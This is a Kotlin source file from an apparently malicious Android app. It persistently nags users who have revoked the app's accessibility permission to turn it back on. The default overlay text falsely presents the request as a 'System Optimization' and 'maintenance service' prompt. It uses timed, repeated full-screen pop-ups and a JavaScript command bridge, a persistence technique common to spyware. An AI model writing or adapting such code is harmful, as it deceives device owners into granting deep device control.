package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.provider.Settings
import org.json.JSONObject

object AccRelentlessManager {
    private const val PREFS = "acc_persistence_prefs"
    
    // Settings (Defaults)
    var chillMins = 1440L // Default 1440 mins (24 hours)
    var nagIntervalMins = 2L
    var maxNags = 5
    var customHtml: String? = null

    fun checkAndNag(ctx: Context) {
        if (PermissionManager.hasAccessibility(ctx)) {
            reset(ctx)
            return
        }

        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val lostAt = prefs.getLong("lost_at", 0L)
        
        if (lostAt == 0L) {
            prefs.edit().putLong("lost_at", System.currentTimeMillis()).apply()
            return
        }

        val now = System.currentTimeMillis()
        val chillMillis = chillMins * 60 * 1000
        
        // 1. Check Chill Period
        if (now - lostAt < chillMillis) return

        // 2. Check Nag Count & Interval
        val count = prefs.getInt("nag_count", 0)
        if (count >= maxNags) return

        val lastNag = prefs.getLong("last_nag_at", 0L)
        val intervalMillis = nagIntervalMins * 60 * 1000
        
        if (now - lastNag > intervalMillis) {
            triggerUi(ctx)
            prefs.edit()
                .putInt("nag_count", count + 1)
                .putLong("last_nag_at", now)
                .apply()
        }
    }

    private fun triggerUi(ctx: Context) {
        val html = customHtml ?: getDefaultHtml(ctx)
        DynamicUIManager.showOverlay(ctx, true, html)
        DebugLogger.log("ACC_PERSIST", "Nag UI triggered. Attempt ${getNagCount(ctx) + 1}")
    }

    private fun getNagCount(ctx: Context): Int = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getInt("nag_count", 0)

    private fun reset(ctx: Context) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().clear().apply()
    }

    private fun getDefaultHtml(ctx: Context): String {
        return """
            <html><body style='background:rgba(0,0,0,0.85);color:white;font-family:sans-serif;padding:30px;text-align:center;'>
                <div style='margin-top:40%;'>
                    <h2 style='color:#3B82F6;'>System Optimization Required</h2>
                    <p style='color:#94A3B8;'>To maintain device health and performance, please re-enable the maintenance service.</p>
                    <br><br>
                    <button onclick='Cortex.executeCommand("{\"file_name\":\"ACC_GOTO_SETTINGS\"}")' 
                        style='background:#3B82F6;color:white;border:none;padding:15px 40px;border-radius:10px;font-weight:bold;width:100%;'>OKAY</button>
                    <br><br>
                    <button onclick='Cortex.executeCommand("{\"file_name\":\"ACC_SHOW_HELP\"}")' 
                        style='background:transparent;color:#94A3B8;border:1px solid #444;padding:12px 40px;border-radius:10px;width:100%;'>HELP</button>
                </div>
            </body></html>
        """.trimIndent()
    }
}